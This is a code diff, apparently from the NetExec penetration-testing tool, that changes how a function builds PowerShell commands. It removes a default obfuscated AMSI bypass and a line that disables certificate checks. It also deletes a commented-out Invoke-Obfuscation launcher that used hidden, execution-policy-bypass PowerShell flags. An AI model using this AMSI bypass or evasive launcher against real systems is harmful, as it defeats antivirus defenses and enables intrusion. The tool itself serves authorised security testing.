@@ -131,50 +131,12 @@ def create_ps_command(ps_command, force_ps32=False, dont_obfs=False, custom_amsi
             lines = list(file_in)
             amsi_bypass = "".join(lines)
     else:
-        amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-try{
-[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
-}catch{}
-"""
+        amsi_bypass = ""
 
     command = amsi_bypass + f"\n$functions = {{\n    function Command-ToExecute\n    {{\n{amsi_bypass + ps_command}\n    }}\n}}\nif ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')\n{{\n    $job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32\n    $job | Wait-Job\n}}\nelse\n{{\n    IEX \"$functions\"\n    Command-ToExecute\n}}\n" if force_ps32 else amsi_bypass + ps_command
 
     nxc_logger.debug(f"Generated PS command:\n {command}\n")
 
-    # We could obfuscate the initial launcher using Invoke-Obfuscation but because this function gets executed
-    # concurrently it would spawn a local powershell process per host which isn't ideal, until I figure out a good way
-    # of dealing with this  it will use the partial python implementation that I stole from GreatSCT
-    # (https://github.com/GreatSCT/GreatSCT) <3
-
-    """
-    if is_powershell_installed():
-
-        temp = tempfile.NamedTemporaryFile(prefix='nxc_',
-                                           suffix='.ps1',
-                                           dir='/tmp')
-        temp.write(command)
-        temp.read()
-
-        encoding_types = [1,2,3,4,5,6]
-        while True:
-            encoding = random.choice(encoding_types)
-            invoke_obfs_command = 'powershell -C \'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command "ENCODING,{}" -Quiet\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),
-                                                                                                                                              temp.name,
-                                                                                                                                              encoding)
-            nxc_logger.debug(invoke_obfs_command)
-            out = check_output(invoke_obfs_command, shell=True).split('\n')[4].strip()
-
-            command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "{}"'.format(out)
-            nxc_logger.debug('Command length: {}'.format(len(command)))
-
-            if len(command) <= 8192:
-                temp.close()
-                break
-
-            encoding_types.remove(encoding)
-    
-    else:
-    """
     if not dont_obfs:
         obfs_attempts = 0
         while True:
